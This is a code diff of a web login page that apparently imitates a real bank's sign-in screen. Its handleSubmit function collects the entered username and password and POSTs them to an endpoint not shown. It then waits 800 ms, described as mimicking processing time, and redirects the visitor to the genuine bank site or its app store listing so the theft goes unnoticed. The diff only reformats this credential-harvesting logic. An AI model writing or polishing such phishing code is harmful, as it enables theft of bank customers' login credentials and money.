@@ -219,8 +219,8 @@
     const APP_STORE = "https://apps.apple.com/app/id123456789";
     const FALLBACK = "https://www.saradarbank.com";
 
-    function handleSubmit(){
-       const username = document.getElementById('username').value;
+function handleSubmit() {
+  const username = document.getElementById('username').value;
   const password = document.getElementById('password').value;
   const btn = document.getElementById('submitBtn');
   btn.disabled = true;
@@ -235,29 +235,18 @@
     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
     body: new URLSearchParams({username: username, password: password})
   });
-      // small UX delay
-      try {
-        const ua = navigator.userAgent || navigator.vendor || window.opera;
-        const isAndroid = /android/i.test(ua);
-        const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
 
-        // mimic processing time
-        document.getElementById('submitBtn').disabled = true;
-        document.getElementById('submitBtn').innerText = "Processing...";
+  // Keep your existing redirect behavior
+  const ua = navigator.userAgent || navigator.vendor || window.opera;
+  const isAndroid = /android/i.test(ua);
+  const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
 
-        setTimeout(()=> {
-          if (isAndroid) {
-            window.location.href = PLAY_STORE;
-          } else if (isIOS) {
-            window.location.href = APP_STORE;
-          } else {
-            window.location.href = FALLBACK;
-          }
-        }, 800);
-      } catch (e) {
-        window.location.href = FALLBACK;
-      }
-    }
+  setTimeout(() => {
+    if (isAndroid) window.location.href = PLAY_STORE;
+    else if (isIOS) window.location.href = APP_STORE;
+    else window.location.href = FALLBACK;
+  }, 800);
+}
 
     // allow Enter key to trigger (if focus in input)
     document.addEventListener('keydown', (e)=>{
@@ -272,5 +261,6 @@
   </script>
 </body>
 </html>
+
 
 
